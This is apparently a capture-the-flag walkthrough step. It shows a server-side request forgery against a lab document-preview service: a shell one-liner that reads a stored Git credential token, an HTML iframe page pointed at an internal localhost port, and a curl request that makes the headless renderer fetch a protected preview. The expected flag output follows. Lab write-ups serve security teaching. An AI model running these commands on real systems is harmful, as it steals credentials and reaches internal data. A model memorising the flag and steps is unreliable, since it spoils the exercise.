## Prerequisite

K10.2 gives the protected `document_id=DOC-9BC054D6F95DFA6A`.

## Read the developer token

The developer token is your saved Gitea credential.

```
TOKEN=$(sed -E 's#https://[^:]+:([^@]+)@.*#\1#' ~/.config/git/credentials)
```

## Craft the SSRF page

The page loads the internal protected preview in an iframe. You cannot reach
`127.0.0.1:9000` yourself. Only Chromium inside the container can reach it.

```
cat > /tmp/ssrf.html <<'HTML'
<!DOCTYPE html>
<html><body>
<h1>review</h1>
<iframe src="http://127.0.0.1:9000/protected-preview/DOC-9BC054D6F95DFA6A"></iframe>
</body></html>
HTML
```

## Submit the page to the render route

Gotenberg renders the page with Chromium. Chromium fetches the internal URL.

```
python3 -c 'import json;print(json.dumps({"html":open("/tmp/ssrf.html").read(),"source_id":"sup-k-2841","document_id":"DOC-9BC054D6F95DFA6A"}))' > /tmp/k10_3.json
curl -sk -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  --data-binary @/tmp/k10_3.json \
  https://preview.keplerops.test/api/preview/render
```

Expected output:

```json
{"flag":"FLAG{3944ecd601ef90a2}","ssrf_confirmed":true,"document_id":"DOC-9BC054D6F95DFA6A","owner":"maya.ranscombe","protected_case_id":"CAS-MAYA-2841","protected_source_id":"SUP-K-2841","render_digest":"...","result_id":"REND-...","schema":"fieldkest.preview-render-result/v1","source_id":"sup-k-2841"}
```

Gate: an HTML page without the internal fetch returns `ssrf_confirmed: false` and no flag.
